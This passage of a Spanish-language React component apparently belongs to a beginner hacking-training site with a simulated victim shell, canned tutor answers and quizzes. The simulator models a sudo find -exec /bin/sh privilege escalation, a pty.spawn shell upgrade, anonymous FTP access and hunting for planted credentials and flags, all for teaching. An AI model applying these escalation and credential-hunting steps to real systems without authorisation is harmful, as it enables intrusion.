  "ftp": "ftp IP → usuario: anonymous, contraseña: vacío. Luego ls -la para listar, get archivo para descargar. Si hay archivos interesantes, descárgalos todos.",
  "robots": "curl http://IP/robots.txt siempre como primer paso en enumeración web. Los admins ponen ahí las rutas que no quieren que Google indexe, como /admin/, /backup/, /.git/",
  "default": "No tengo información específica sobre ese tema. Intenta buscar en: HackTricks (book.hacktricks.xyz), GTFOBins (gtfobins.github.io), o TryHackMe Learn (tryhackme.com/learn)."
};

// ============================================================
// SIMULADOR DE TERMINAL
// ============================================================
const SISTEMA_SIMULADO = {
  usuario: "waldo",
  hostname: "victim",
  directorio: "/home/waldo",
  archivos: {
    "/home/waldo": ["user.txt", "notas.txt", ".bash_history", "Desktop/", "Downloads/"],
    "/home/waldo/Desktop": ["secret.txt"],
    "/etc": ["passwd", "shadow", "hosts", "crontab"],
    "/tmp": [],
    "/var/www/html": ["index.php", "login.php", "config.php", ".htaccess"],
    "/root": ["root.txt", ".bash_history"]
  },
  contenido: {
    "user.txt": "THM{us3r_fl4g_h3r3_7829}",
    "notas.txt": "Lista de tareas:\n- Actualizar servidor web\n- Revisar logs\n- Cambiar contraseña de admin",
    ".bash_history": "ls -la\ncd /var/www/html\ncat config.php\nmysql -u root -p 'S3cr3tDB!'\nssh admin@192.168.100.10\n",
    "secret.txt": "Credenciales backup: admin:backup123",
    "config.php": "<?php\n$db_host = 'localhost';\n$db_user = 'webapp';\n$db_pass = 'W3bApp_P4ss!';\n$db_name = 'webapp';\n?>",
    "passwd": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/nologin\nwaldo:x:1000:1000::/home/waldo:/bin/bash\nwww-data:x:33:33::/var/www:/nologin",
    "root.txt": "THM{r00t_fl4g_9f2k3}",
    "hosts": "127.0.0.1 localhost\n127.0.1.1 victim\n10.10.10.1 target.thm"
  }
};

function procesarComando(cmd, estado) {
  const partes = cmd.trim().split(/\s+/);
  const comando = partes[0];
  const args = partes.slice(1);
  const dir = estado.directorio;

  if (!comando) return { output: "", nuevoEstado: estado };

  // whoami
  if (comando === "whoami") {
    return { output: estado.usuario, nuevoEstado: estado };
  }

  // id
  if (comando === "id") {
    const uid = estado.usuario === "root" ? "0" : "1000";
    return { output: `uid=${uid}(${estado.usuario}) gid=${uid}(${estado.usuario}) groups=${uid}(${estado.usuario})`, nuevoEstado: estado };
  }

  // pwd
  if (comando === "pwd") {
    return { output: dir, nuevoEstado: estado };
  }

  // hostname
  if (comando === "hostname") {
    return { output: estado.hostname, nuevoEstado: estado };
  }

  // uname
  if (comando === "uname" && args.includes("-a")) {
    return { output: "Linux victim 5.10.0-kali3-amd64 #1 SMP Debian 5.10.13-1kali1 x86_64 GNU/Linux", nuevoEstado: estado };
  }

  // clear
  if (comando === "clear") {
    return { output: "__CLEAR__", nuevoEstado: estado };
  }

  // ls
  if (comando === "ls") {
    const targetDir = args.find(a => !a.startsWith("-")) || dir;
    const ruta = targetDir.startsWith("/") ? targetDir : `${dir}/${targetDir}`;
    const archivos = SISTEMA_SIMULADO.archivos[ruta] || SISTEMA_SIMULADO.archivos[dir] || [];
    const mostrarOcultos = args.includes("-a") || args.includes("-la") || args.includes("-al");
    const detalle = args.includes("-l") || args.includes("-la") || args.includes("-al");

    let resultado = archivos.filter(f => mostrarOcultos || !f.startsWith("."));

    if (detalle) {
      return {
        output: "total " + (resultado.length * 4) + "\n" + resultado.map(f => {
          const esDir = f.endsWith("/");
          const perms = esDir ? "drwxr-xr-x" : "-rw-r--r--";
          return `${perms} 1 ${estado.usuario} ${estado.usuario} ${Math.floor(Math.random() * 4096) + 100} Jun  1 ${f}`;
        }).join("\n"),
        nuevoEstado: estado
      };
    }
    return { output: resultado.join("  "), nuevoEstado: estado };
  }

  // cd
  if (comando === "cd") {
    const destino = args[0] || "/home/" + estado.usuario;
    let nuevaRuta;

    if (destino === "~") nuevaRuta = "/home/" + estado.usuario;
    else if (destino === "..") {
      const partes2 = dir.split("/").filter(Boolean);
      partes2.pop();
      nuevaRuta = "/" + partes2.join("/") || "/";
    } else if (destino === "/") nuevaRuta = "/";
    else if (destino.startsWith("/")) nuevaRuta = destino;
    else nuevaRuta = dir === "/" ? `/${destino}` : `${dir}/${destino}`;

    nuevaRuta = nuevaRuta.replace(/\/+/g, "/");
    if (nuevaRuta !== "/" && nuevaRuta.endsWith("/")) nuevaRuta = nuevaRuta.slice(0, -1);

    if (SISTEMA_SIMULADO.archivos[nuevaRuta] !== undefined || nuevaRuta === "/") {
      return { output: "", nuevoEstado: { ...estado, directorio: nuevaRuta } };
    }
    return { output: `bash: cd: ${destino}: No such file or directory`, nuevoEstado: estado };
  }

  // cat
  if (comando === "cat") {
    const archivo = args[0];
    if (!archivo) return { output: "cat: missing operand", nuevoEstado: estado };

    const nombreArchivo = archivo.includes("/") ? archivo.split("/").pop() : archivo;
    const contenido = SISTEMA_SIMULADO.contenido[nombreArchivo];

    if (nombreArchivo === "shadow" && estado.usuario !== "root") {
      return { output: "cat: /etc/shadow: Permission denied", nuevoEstado: estado };
    }
    if (nombreArchivo === "root.txt" && estado.usuario !== "root") {
      return { output: "cat: /root/root.txt: Permission denied", nuevoEstado: estado };
    }
    if (contenido) return { output: contenido, nuevoEstado: estado };
    return { output: `cat: ${archivo}: No such file or directory`, nuevoEstado: estado };
  }

  // sudo -l
  if (comando === "sudo" && args[0] === "-l") {
    return {
      output: `Matching Defaults entries for ${estado.usuario}:
    env_reset, mail_badpass

User ${estado.usuario} may run the following commands on victim:
    (ALL : ALL) NOPASSWD: /usr/bin/find`,
      nuevoEstado: estado
    };
  }

  // sudo find . -exec /bin/sh o /bin/bash
  if (comando === "sudo" && args[0] === "find") {
    if (args.includes("-exec") && (args.includes("/bin/sh\\;") || args.includes("/bin/bash\\;") || cmd.includes("/bin/sh") || cmd.includes("/bin/bash"))) {
      return {
        output: "# ¡Escalada exitosa!\nroot@victim:/home/waldo# id\nuid=0(root) gid=0(root) groups=0(root)\n\n🎉 ¡Eres ROOT! Ahora puedes: cat /root/root.txt",
        nuevoEstado: { ...estado, usuario: "root" }
      };
    }
  }

  // find
  if (comando === "find") {
    if (args.includes("-perm") && args.includes("-4000")) {
      return { output: "/usr/bin/sudo\n/usr/bin/passwd\n/usr/bin/find\n/usr/bin/newgrp\n/usr/sbin/mount", nuevoEstado: estado };
    }
    if (args.includes("-name")) {
      const nombre = args[args.indexOf("-name") + 1];
      if (nombre && nombre.includes("flag")) {
        return { output: "/home/waldo/user.txt\n/root/root.txt", nuevoEstado: estado };
      }
      if (nombre && nombre.includes("*.txt")) {
        return { output: "/home/waldo/user.txt\n/home/waldo/notas.txt\n/home/waldo/Desktop/secret.txt", nuevoEstado: estado };
      }
    }
    return { output: "", nuevoEstado: estado };
  }

  // echo
  if (comando === "echo") {
    const texto = args.join(" ").replace(/['"]/g, "");
    if (texto.startsWith("$")) {
      const vars = { USER: estado.usuario, HOME: "/home/" + estado.usuario, SHELL: "/bin/bash", PWD: dir, HOSTNAME: estado.hostname };
      const varName = texto.slice(1);
      return { output: vars[varName] || "", nuevoEstado: estado };
    }
    return { output: texto, nuevoEstado: estado };
  }

  // history
  if (comando === "history") {
    return {
      output: `  1  ls -la\n  2  cd /var/www/html\n  3  cat config.php\n  4  sudo -l\n  5  find / -perm -4000 2>/dev/null\n  6  cat user.txt`,
      nuevoEstado: estado
    };
  }

  // ps
  if (comando === "ps" && (args.includes("aux") || args.includes("-aux"))) {
    return {
      output: `USER       PID %CPU %MEM COMMAND
root         1  0.0  0.1 /sbin/init
root       456  0.0  0.2 /usr/sbin/sshd
root       789  0.0  0.3 /usr/sbin/apache2
${estado.usuario}     1234  0.1  0.5 bash`,
      nuevoEstado: estado
    };
  }

  // ip a
  if (comando === "ip" && args[0] === "a") {
    return {
      output: `1: lo: <LOOPBACK,UP,LOWER_UP>
    inet 127.0.0.1/8
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP>
    inet 10.10.10.1/24
3: tun0: <POINTOPOINT,UP,LOWER_UP>
    inet 10.8.0.2/17`,
      nuevoEstado: estado
    };
  }

  // ifconfig
  if (comando === "ifconfig") {
    return {
      output: `eth0: flags=4163<UP,BROADCAST>  inet 10.10.10.1  netmask 255.255.255.0
lo:   flags=73<UP,LOOPBACK>      inet 127.0.0.1   netmask 255.0.0.0
tun0: flags=4305<UP,POINTOPOINT> inet 10.8.0.2    netmask 255.255.128.0`,
      nuevoEstado: estado
    };
  }

  // ss o netstat
  if (comando === "ss" || comando === "netstat") {
    return {
      output: `Netid  State   Local Address:Port
tcp    LISTEN  0.0.0.0:22          (sshd)
tcp    LISTEN  0.0.0.0:80          (apache2)
tcp    LISTEN  127.0.0.1:3306      (mysqld) ← solo local!`,
      nuevoEstado: estado
    };
  }

  // uname
  if (comando === "uname") {
    return { output: "Linux", nuevoEstado: estado };
  }

  // which
  if (comando === "which") {
    const tools = { python3: "/usr/bin/python3", nmap: "/usr/bin/nmap", nc: "/usr/bin/nc", curl: "/usr/bin/curl", wget: "/usr/bin/wget", bash: "/bin/bash" };
    return { output: tools[args[0]] || `which: no ${args[0]} in PATH`, nuevoEstado: estado };
  }

  // python3
  if (comando === "python3" && cmd.includes("pty.spawn")) {
    return {
      output: `${estado.usuario}@${estado.hostname}:${dir}$ \n✅ Shell mejorada a TTY. Ahora tienes Tab y historial.`,
      nuevoEstado: estado
    };
  }

  // help
  if (comando === "help" || comando === "?") {
    return {
      output: `Comandos disponibles en este simulador:
─────────────────────────────────────────
Navegación: ls, cd, pwd, find
Archivos:   cat, echo, history
Sistema:    whoami, id, uname, hostname
Red:        ip a, ifconfig, ss, which
Privilegios: sudo -l, sudo find . -exec /bin/sh \\;
─────────────────────────────────────────
Usa Tab para autocompletar (próximamente)
Escribe 'hint' para una pista`,
      nuevoEstado: estado
    };
  }

  // hint
  if (comando === "hint") {
    return {
      output: `💡 Pistas para este sistema:
• Hay archivos ocultos en el directorio home
• Revisa el historial de bash: cat ~/.bash_history
• Este usuario puede ejecutar algo con sudo
• Hay credenciales en /var/www/html/config.php`,
      nuevoEstado: estado
    };
  }

  // comando no encontrado
  return {
    output: `bash: ${comando}: command not found\nEscribe 'help' para ver comandos disponibles`,
    nuevoEstado: estado
  };
}

// ============================================================
// COMPONENTE PRINCIPAL
// ============================================================
const BLOQUES = [
  { id: 1, nombre: "Fundamentos", icon: "🟢", color: "#4ade80", niveles: [1,2,3,4,5,6,7,8] },
  { id: 2, nombre: "Permisos y Sistema", icon: "🟡", color: "#f59e0b", niveles: [9,10,11,12] },
  { id: 3, nombre: "Red y Reconocimiento", icon: "🔵", color: "#38bdf8", niveles: [13,14,15,16] },
  { id: 4, nombre: "Explotación", icon: "🔴", color: "#f43f5e", niveles: [17,18,19,20] }
];

const CSS_TERMINAL = `
  @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Rajdhani:wght@600;700&display=swap');
  .t-btn{cursor:pointer;border:none;transition:all .15s;border-radius:6px;font-family:'Rajdhani',sans-serif;font-weight:700;letter-spacing:1px}
  .t-btn:hover:not(:disabled){filter:brightness(1.2);transform:translateY(-1px)}
  .t-btn:disabled{opacity:.4;cursor:not-allowed}
  .t-opt{width:100%;text-align:left;padding:12px 16px;margin:5px 0;border-radius:6px;cursor:pointer;font-family:'JetBrains Mono',monospace;font-size:12px;border:1px solid #1e2a3a;background:#060d1a;color:#7a8a9a;transition:all .12s}
  .t-opt:hover:not(:disabled){border-color:#00d4ff44;background:#0a1628;color:#c9d1d9}
  .t-input{width:100%;background:#020810;border:1px solid #00d4ff33;color:#00d4ff;padding:10px 14px;border-radius:6px;font-family:'JetBrains Mono',monospace;font-size:13px;outline:none}
  .t-input:focus{border-color:#00d4ff88;box-shadow:0 0 12px #00d4ff22}
  @keyframes fadeUp{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)}}
  .fade-in{animation:fadeUp 0.25s ease forwards}
  @keyframes blink{0%,100%{opacity:1}50%{opacity:0}}
  .cursor{animation:blink 1s infinite;color:#00d4ff}
  @keyframes glow{0%,100%{box-shadow:0 0 5px #00d4ff22}50%{box-shadow:0 0 20px #00d4ff44}}
  .glow-border{animation:glow 2s infinite}
  .scrollbar::-webkit-scrollbar{width:4px}
  .scrollbar::-webkit-scrollbar-track{background:#020810}
  .scrollbar::-webkit-scrollbar-thumb{background:#00d4ff44;border-radius:2px}
`;

export default function Terminal({ progresoT, onCompletarT, onIrTHM }) {
  const [vista, setVista] = useState("menu"); // menu | aprender | shell | desafios | ia
  const [bloqueActivo, setBloqueActivo] = useState(null);
  const [nivelIdx, setNivelIdx] = useState(0);
  const [fase, setFase] = useState("teoria"); // teoria | quiz
  const [respuesta, setRespuesta] = useState(null);
  const [enviado, setEnviado] = useState(false);
  const [vidas, setVidas] = useState(3);
  const [xpTotal, setXpTotal] = useState(progresoT?.xp || 0);
  const [nivelesCompletados, setNivelesCompletados] = useState(progresoT?.completados || []);

  // Shell
  const [historial, setHistorial] = useState([
    { tipo: "sistema", texto: "HACKFORGE Terminal Simulator v1.0" },
    { tipo: "sistema", texto: "Conectado a: victim.thm | Usuario: waldo" },
    { tipo: "sistema", texto: 'Escribe "help" para ver comandos disponibles.' },
    { tipo: "sistema", texto: "─".repeat(50) }
  ]);
  const [estadoShell, setEstadoShell] = useState({
    usuario: "waldo", hostname: "victim", directorio: "/home/waldo"
  });
  const [inputShell, setInputShell] = useState("");
  const [histCmds, setHistCmds] = useState([]);
  const [histIdx, setHistIdx] = useState(-1);

  // Desafío
  const [desafioActivo, setDesafioActivo] = useState(null);
  const [pasoDesafio, setPasoDesafio] = useState(0);
  const [desafioCompletado, setDesafioCompletado] = useState(false);

  // IA
  const [mensajesIA, setMensajesIA] = useState([
    { rol: "ia", texto: "👋 Hola! Soy el asistente TERMINAL. Pregúntame sobre cualquier herramienta o técnica de hacking. Por ejemplo: ¿Cómo uso nmap? ¿Qué es una reverse shell? ¿Cómo escalo privilegios?" }
  ]);
  const [inputIA, setInputIA] = useState("");

  const shellEndRef = useRef(null);
  const iaEndRef = useRef(null);
  const shellInputRef = useRef(null);

  useEffect(() => {
    shellEndRef.current?.scrollIntoView({ behavior: "smooth" });
  }, [historial]);

  useEffect(() => {
    iaEndRef.current?.scrollIntoView({ behavior: "smooth" });
  }, [mensajesIA]);

  const nivelActual = bloqueActivo ? NIVELES.find(n => n.id === bloqueActivo.niveles[nivelIdx]) : null;

  const resetNivel = () => {
    setRespuesta(null);
    setEnviado(false);
    setFase("teoria");
  };

  const responderQuiz = (idx) => {
    if (enviado) return;
    setRespuesta(idx);
    setEnviado(true);
    if (idx !== nivelActual.correcta) {
      setVidas(v => Math.max(0, v - 1));
    } else {
      // Completar nivel
      if (!nivelesCompletados.includes(nivelActual.id)) {
        const nuevos = [...nivelesCompletados, nivelActual.id];
        setNivelesCompletados(nuevos);
        setXpTotal(x => x + nivelActual.xp);
        if (onCompletarT) onCompletarT(`terminal_nivel_${nivelActual.id}`, nivelActual.xp);
      }
    }
  };

  const siguienteNivel = () => {
    if (nivelIdx < bloqueActivo.niveles.length - 1) {
      setNivelIdx(i => i + 1);
      resetNivel();
      setVidas(3);
    } else {
      setVista("aprender");
      setBloqueActivo(null);
      setNivelIdx(0);
      resetNivel();
    }
  };

  const ejecutarComandoShell = (cmd) => {
    if (!cmd.trim()) return;

    setHistCmds(h => [cmd, ...h]);
    setHistIdx(-1);

    const prompt = `${estadoShell.usuario}@${estadoShell.hostname}:${estadoShell.directorio}$`;
    const { output, nuevoEstado } = procesarComando(cmd, estadoShell);

    setEstadoShell(nuevoEstado);

    if (output === "__CLEAR__") {
      setHistorial([{ tipo: "sistema", texto: "Pantalla limpiada." }]);
    } else {
      setHistorial(h => [
        ...h,
        { tipo: "input", texto: `${prompt} ${cmd}` },
        ...(output ? [{ tipo: "output", texto: output }] : [])
      ]);
    }

    // Verificar progreso en desafío
    if (desafioActivo && !desafioCompletado) {
      const cmdEsperado = desafioActivo.solucion[pasoDesafio];
      if (cmd.trim().startsWith(cmdEsperado.split(" ")[0]) || cmd.includes(cmdEsperado.split(" ")[1] || "")) {
        if (pasoDesafio + 1 >= desafioActivo.solucion.length) {
          setDesafioCompletado(true);
          setXpTotal(x => x + desafioActivo.xp);
          setHistorial(h => [...h, {
            tipo: "sistema",
            texto: `🎉 DESAFÍO COMPLETADO: ${desafioActivo.titulo}\n+${desafioActivo.xp} XP | FLAG: ${desafioActivo.flag}`
          }]);
        } else {
          setPasoDesafio(p => p + 1);
          setHistorial(h => [...h, {
            tipo: "sistema",
            texto: `✅ Paso ${pasoDesafio + 1}/${desafioActivo.solucion.length} completado. Siguiente: ${desafioActivo.objetivos[pasoDesafio + 1]}`
          }]);
        }
      }
    }

    setInputShell("");
  };

  const handleKeyShell = (e) => {
    if (e.key === "Enter") {
      ejecutarComandoShell(inputShell);
    } else if (e.key === "ArrowUp") {
      e.preventDefault();
      const newIdx = Math.min(histIdx + 1, histCmds.length - 1);
      setHistIdx(newIdx);
      setInputShell(histCmds[newIdx] || "");
    } else if (e.key === "ArrowDown") {
      e.preventDefault();
      const newIdx = Math.max(histIdx - 1, -1);
      setHistIdx(newIdx);
      setInputShell(newIdx === -1 ? "" : histCmds[newIdx]);
    }
  };

  const responderIA = (pregunta) => {
    if (!pregunta.trim()) return;
    setMensajesIA(m => [...m, { rol: "user", texto: pregunta }]);
    setInputIA("");

    const lower = pregunta.toLowerCase();
    let respuesta = IA_BASE.default;
    for (const [clave, resp] of Object.entries(IA_BASE)) {
      if (lower.includes(clave)) { respuesta = resp; break; }
    }

    setTimeout(() => {
      setMensajesIA(m => [...m, { rol: "ia", texto: respuesta }]);
    }, 600);
  };

  const progresoBloques = BLOQUES.map(b => {
    const completados = b.niveles.filter(id => nivelesCompletados.includes(id)).length;
    return { ...b, completados, total: b.niveles.length, porcentaje: Math.round((completados / b.niveles.length) * 100) };
  });

  const BG = "#020810";
  const PANEL = "#060d1a";
  const BORDER = "#0d1f35";
  const TEXT = "#8a9ab0";
  const CYAN = "#00d4ff";

  // ── MENÚ PRINCIPAL ──
  if (vista === "menu") return (
    <div style={{ fontFamily: "'Rajdhani',sans-serif", color: "#c9d1d9", background: BG, minHeight: "100%" }}>
      <style>{CSS_TERMINAL}</style>

      {/* Header */}
      <div style={{ marginBottom: 32 }}>
        <div style={{ color: CYAN, fontSize: 11, letterSpacing: 4, marginBottom: 8 }}>◈ HACKFORGE // TERMINAL</div>
        <h1 style={{ color: "#fff", fontSize: 28, margin: "0 0 8px", fontFamily: "'Rajdhani',sans-serif", letterSpacing: 2 }}>
          TERMINAL <span style={{ color: CYAN }}>HQ</span>
        </h1>
        <p style={{ color: TEXT, fontSize: 14, maxWidth: 600, fontFamily: "'JetBrains Mono',monospace" }}>
          De cero a hacker. Domina Linux, CTFs y TryHackMe con práctica real.
        </p>
        <div style={{ display: "flex", gap: 16, marginTop: 12 }}>
          <div style={{ background: PANEL, border: `1px solid ${CYAN}33`, borderRadius: 8, padding: "8px 16px", fontSize: 12, fontFamily: "'JetBrains Mono',monospace" }}>
            <span style={{ color: CYAN }}>⚡</span> <span style={{ color: "#fff" }}>{xpTotal}</span> <span style={{ color: TEXT }}>XP</span>
          </div>
          <div style={{ background: PANEL, border: `1px solid #4ade8033`, borderRadius: 8, padding: "8px 16px", fontSize: 12, fontFamily: "'JetBrains Mono',monospace" }}>
            <span style={{ color: "#4ade80" }}>✓</span> <span style={{ color: "#fff" }}>{nivelesCompletados.length}</span> <span style={{ color: TEXT }}>/20 niveles</span>
          </div>
        </div>
      </div>

      {/* Cards principales */}
      <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fill,minmax(260px,1fr))", gap: 16, marginBottom: 32 }}>
        {[
          { id: "aprender", icon: "📚", titulo: "APRENDER", subtitulo: "20 niveles · Básico a Avanzado", color: "#4ade80", desc: "Teoría + Quiz interactivo sobre Linux, permisos, redes, hacking y CTFs." },
          { id: "shell", icon: "💻", titulo: "TERMINAL", subtitulo: "Simulador interactivo", color: CYAN, desc: "Practica comandos reales en un sistema Linux simulado. Sin riesgo." },
          { id: "desafios", icon: "🏴", titulo: "CTF LABS", subtitulo: "Desafíos guiados", color: "#f59e0b", desc: "Escenarios reales de TryHackMe simulados. Reconocimiento, escalada y flags." },
          { id: "ia", icon: "🤖", titulo: "ASISTENTE", subtitulo: "IA simulada", color: "#a78bfa", desc: "Pregunta sobre cualquier herramienta o técnica. Respuestas instantáneas." },
          { id: "thm", icon: "🏴", titulo: "THM SALAS", subtitulo: "5 salas simuladas", color: "#f43f5e", desc: "Salas completas de TryHackMe simuladas. Basic Linux, Web Enum, Privesc, Reverse Shell y Simple CTF." }
        ].map(item => (
          <div key={item.id}
            className="fade-in glow-border"
            onClick={() => item.id === 'thm' ? onIrTHM() : setVista(item.id)}
            style={{
              background: PANEL, border: `1px solid ${item.color}33`,
              borderRadius: 12, padding: 24, cursor: "pointer",
              transition: "all .2s"
            }}
            onMouseEnter={e => { e.currentTarget.style.borderColor = item.color + "88"; e.currentTarget.style.background = "#0a1628"; }}
            onMouseLeave={e => { e.currentTarget.style.borderColor = item.color + "33"; e.currentTarget.style.background = PANEL; }}>
            <div style={{ fontSize: 32, marginBottom: 12 }}>{item.icon}</div>
            <div style={{ color: item.color, fontSize: 13, letterSpacing: 3, marginBottom: 4 }}>{item.titulo}</div>
            <div style={{ color: "#fff", fontSize: 15, fontWeight: "bold", marginBottom: 8 }}>{item.subtitulo}</div>
            <div style={{ color: TEXT, fontSize: 12, fontFamily: "'JetBrains Mono',monospace", lineHeight: 1.6 }}>{item.desc}</div>
            <div style={{ marginTop: 16, color: item.color, fontSize: 12 }}>Entrar →</div>
          </div>
        ))}
      </div>

      {/* Progreso por bloques */}
      <div style={{ background: PANEL, border: `1px solid ${BORDER}`, borderRadius: 12, padding: 24 }}>
        <div style={{ color: CYAN, fontSize: 11, letterSpacing: 3, marginBottom: 16 }}>PROGRESO POR BLOQUE</div>
        <div style={{ display: "flex", flexDirection: "column", gap: 12 }}>
          {progresoBloques.map(b => (
            <div key={b.id}>
              <div style={{ display: "flex", justifyContent: "space-between", marginBottom: 6 }}>
                <span style={{ color: "#fff", fontSize: 13 }}>{b.icon} {b.nombre}</span>
                <span style={{ color: b.color, fontSize: 12, fontFamily: "'JetBrains Mono',monospace" }}>{b.completados}/{b.total}</span>
              </div>
              <div style={{ height: 4, background: BORDER, borderRadius: 2, overflow: "hidden" }}>
                <div style={{ height: "100%", width: `${b.porcentaje}%`, background: b.color, borderRadius: 2, transition: "width 0.5s", boxShadow: `0 0 8px ${b.color}66` }} />
              </div>
            </div>
          ))}
        </div>
      </div>
    </div>
  );

  // ── APRENDER ──
  if (vista === "aprender" && !bloqueActivo) return (
    <div style={{ fontFamily: "'Rajdhani',sans-serif", color: "#c9d1d9" }}>
      <style>{CSS_TERMINAL}</style>
      <button className="t-btn" onClick={() => setVista("menu")} style={{ background: PANEL, color: TEXT, padding: "8px 16px", fontSize: 12, marginBottom: 24, border: `1px solid ${BORDER}` }}>← MENÚ</button>

      <div style={{ marginBottom: 24 }}>
        <div style={{ color: CYAN, fontSize: 11, letterSpacing: 4, marginBottom: 6 }}>◈ TERMINAL // APRENDER</div>
        <h2 style={{ color: "#fff", fontSize: 22, margin: "0 0 6px" }}>Selecciona un bloque</h2>
      </div>

      <div style={{ display: "flex", flexDirection: "column", gap: 14 }}>
        {progresoBloques.map((bloque, i) => {
          const desbloqueado = i === 0 || progresoBloques[i - 1].porcentaje === 100;
          return (
            <div key={bloque.id}
              className="fade-in"
              onClick={() => { if (desbloqueado) { setBloqueActivo(bloque); setNivelIdx(0); resetNivel(); setVidas(3); setVista("nivel"); } }}
              style={{
                background: PANEL, border: `1px solid ${bloque.completados === bloque.total ? bloque.color + "66" : BORDER}`,
                borderRadius: 10, padding: 20, cursor: desbloqueado ? "pointer" : "not-allowed",
                opacity: desbloqueado ? 1 : 0.4, display: "flex", alignItems: "center", gap: 20,
                transition: "all .2s", animationDelay: `${i * 60}ms`
              }}
              onMouseEnter={e => desbloqueado && (e.currentTarget.style.borderColor = bloque.color + "55")}
              onMouseLeave={e => desbloqueado && (e.currentTarget.style.borderColor = bloque.completados === bloque.total ? bloque.color + "66" : BORDER)}>

              <div style={{ width: 52, height: 52, borderRadius: "50%", background: BG, border: `2px solid ${bloque.completados === bloque.total ? bloque.color : BORDER}`, display: "flex", alignItems: "center", justifyContent: "center", fontSize: 22, flexShrink: 0 }}>
                {bloque.completados === bloque.total ? "✅" : !desbloqueado ? "🔒" : bloque.icon}
              </div>

              <div style={{ flex: 1 }}>
                <div style={{ color: TEXT, fontSize: 10, letterSpacing: 2, marginBottom: 2 }}>BLOQUE {bloque.id}</div>
                <div style={{ color: "#fff", fontWeight: "bold", fontSize: 15, marginBottom: 8 }}>{bloque.nombre}</div>
                <div style={{ display: "flex", justifyContent: "space-between", fontSize: 11, color: TEXT, marginBottom: 4 }}>
                  <span>{bloque.completados}/{bloque.total} niveles</span>
                  <span style={{ color: bloque.color }}>{bloque.porcentaje}%</span>
                </div>
                <div style={{ height: 3, background: BORDER, borderRadius: 2, overflow: "hidden" }}>
                  <div style={{ height: "100%", width: `${bloque.porcentaje}%`, background: bloque.color, borderRadius: 2, transition: "width 0.5s" }} />
                </div>
              </div>
              {desbloqueado && <div style={{ color: bloque.color, fontSize: 20 }}>→</div>}
            </div>
          );
        })}
      </div>
    </div>
  );

  // ── NIVEL (TEORÍA + QUIZ) ──
  if (vista === "nivel" && bloqueActivo && nivelActual) return (
    <div style={{ fontFamily: "'JetBrains Mono',monospace", color: "#c9d1d9", maxWidth: 740, margin: "0 auto" }}>
      <style>{CSS_TERMINAL}</style>

      {/* Header */}
      <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 20 }}>
        <button className="t-btn" onClick={() => { setVista("aprender"); setBloqueActivo(null); }} style={{ background: PANEL, color: TEXT, padding: "8px 16px", fontSize: 11, border: `1px solid ${BORDER}` }}>← BLOQUES</button>
        <div style={{ display: "flex", gap: 6 }}>
          {[...Array(3)].map((_, i) => <span key={i} style={{ fontSize: 14 }}>{i < vidas ? "❤️" : "🖤"}</span>)}
        </div>
      </div>

      {/* Progreso */}
      <div style={{ marginBottom: 20 }}>
        <div style={{ display: "flex", justifyContent: "space-between", fontSize: 11, color: TEXT, marginBottom: 6 }}>
          <span style={{ color: bloqueActivo.color }}>{bloqueActivo.icon} {bloqueActivo.nombre.toUpperCase()}</span>
          <span>{nivelIdx + 1}/{bloqueActivo.niveles.length} · {nivelActual.xp} XP</span>
        </div>
        <div style={{ height: 3, background: BORDER, borderRadius: 2, overflow: "hidden" }}>
          <div style={{ height: "100%", width: `${(nivelIdx / bloqueActivo.niveles.length) * 100}%`, background: bloqueActivo.color, borderRadius: 2 }} />
        </div>
      </div>

      {/* Badge dificultad */}
      <div style={{ display: "inline-block", background: bloqueActivo.color + "22", border: `1px solid ${bloqueActivo.color}44`, color: bloqueActivo.color, fontSize: 10, padding: "3px 10px", borderRadius: 4, letterSpacing: 2, marginBottom: 16 }}>
        {nivelActual.dificultad.toUpperCase()}
      </div>

      {/* TEORÍA */}
      {fase === "teoria" && (
        <div className="fade-in" style={{ opacity: 0 }}>
          <div style={{ color: bloqueActivo.color, fontSize: 10, letterSpacing: 3, marginBottom: 4 }}>NIVEL {nivelActual.id} · TEORÍA</div>
          <h3 style={{ color: "#fff", fontSize: 20, margin: "0 0 16px", fontFamily: "'Rajdhani',sans-serif", letterSpacing: 1 }}>{nivelActual.titulo}</h3>

          <div style={{ background: PANEL, border: `1px solid ${bloqueActivo.color}33`, borderRadius: 10, padding: 24, marginBottom: 16 }}>
            <div style={{ borderLeft: `3px solid ${bloqueActivo.color}`, paddingLeft: 18 }}>
              {nivelActual.teoria.split("\n").map((line, i) => {
                const isBullet = line.trim().startsWith("•");
                const isBlank = line.trim() === "";
                return isBlank ? <br key={i} /> : (
                  <p key={i} style={{ margin: "5px 0", fontSize: 13, lineHeight: 1.9, color: isBullet ? "#c9d1d9" : TEXT }}>{line}</p>
                );
              })}
            </div>
          </div>

          {/* Ejemplo */}
          <div style={{ marginBottom: 20 }}>
            <div style={{ color: TEXT, fontSize: 10, letterSpacing: 2, marginBottom: 8 }}>💻 EJEMPLO</div>
            <div style={{ background: "#020810", border: "1px solid #0d1f35", borderRadius: 8, overflow: "hidden" }}>
              <div style={{ background: "#040c18", padding: "8px 14px", borderBottom: "1px solid #0d1f35", display: "flex", gap: 6, alignItems: "center" }}>
                {["#ff5f57", "#ffbd2e", "#28ca41"].map((c, i) => <div key={i} style={{ width: 10, height: 10, borderRadius: "50%", background: c }} />)}
                <span style={{ color: TEXT, fontSize: 10, marginLeft: 6 }}>bash</span>
              </div>
              <pre style={{ margin: 0, padding: "14px 16px", fontSize: 12, lineHeight: 1.8, color: CYAN, overflowX: "auto", whiteSpace: "pre-wrap" }}>{nivelActual.ejemplo}</pre>
            </div>
          </div>

          <button className="t-btn" onClick={() => setFase("quiz")}
            style={{ background: bloqueActivo.color, color: "#000", padding: "12px 28px", fontSize: 13, width: "100%", letterSpacing: 2 }}>
            ENTENDIDO → IR AL QUIZ
          </button>
        </div>
      )}

      {/* QUIZ */}
      {fase === "quiz" && (
        <div className="fade-in" style={{ opacity: 0 }}>
          <div style={{ color: bloqueActivo.color, fontSize: 10, letterSpacing: 3, marginBottom: 4 }}>NIVEL {nivelActual.id} · QUIZ</div>
          <h3 style={{ color: "#fff", fontSize: 16, margin: "0 0 20px", lineHeight: 1.5 }}>{nivelActual.pregunta}</h3>

          <div style={{ marginBottom: 20 }}>
            {nivelActual.opciones.map((opt, i) => {
